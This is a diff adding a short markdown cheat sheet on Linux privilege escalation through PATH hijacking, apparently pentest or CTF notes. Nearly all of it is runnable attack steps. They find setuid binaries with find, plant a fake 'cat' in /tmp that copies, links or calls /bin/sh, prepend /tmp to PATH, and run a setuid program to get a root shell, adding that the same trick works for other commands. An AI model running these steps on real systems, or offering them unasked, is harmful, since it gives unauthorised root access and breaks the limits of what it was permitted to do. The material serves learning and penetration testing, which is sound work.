@@ -1,0 +1,26 @@
+# Escalate Privilege by leveraging the $PATH variable
+
+1. echo $PATH and see what it lists
+
+2. Find any files with setuid
+   find / -perm -u=s -type f 2>/dev/null
+
+3. Suppose we find a binary called - shell under /scripts
+
+4. Running it gives us the result of cat /etc/passwd so we can create a malicious file for cat and change PATH
+
+5. echo "/bin/sh" > /tmp/cat
+          OR
+   cp /bin/sh /tmp/cat
+          OR
+   ln -s /bin/sh /tmp/cat
+          OR
+  Use vi/nano/gedit etc. to create our file
+
+6. chmod +x cat
+
+7. export PATH=/tmp:$PATH
+
+8. Now once we run ./shell we get a root shell back instantly.
+
+NOTE : As for 'cat' here we can do the same for any command (id,ps etc.) and have it redirect to our root shell.
